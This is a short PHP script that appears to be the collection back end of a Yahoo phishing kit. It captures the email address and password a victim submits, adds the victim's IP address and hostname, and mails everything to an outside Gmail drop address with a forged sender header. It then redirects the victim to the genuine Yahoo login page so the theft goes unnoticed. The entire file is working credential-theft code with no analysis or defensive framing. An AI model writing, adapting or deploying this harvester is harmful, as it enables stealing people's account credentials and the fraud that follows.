<?php 
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);

$message  = "==================+[ YH LOGS ]+==================\n";
$message .= "Email Address : ".$_POST['login']."\n";
$message .= "Password : ".$_POST['passwd']."\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "Domain : ".$_POST['domain']."\n";

$message .= "=============+ [ 2K17 ] +=============\n";

$send= "serviceonlinecare01@gmail.com";

$subject = "LOGS | BLESS UP 2K120 | $ip";
$headers = "From:  2K17<ahmednasir@cisco.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail($send,$subject,$message,$headers);

header("Location: http://login.yahoo.com/");
?>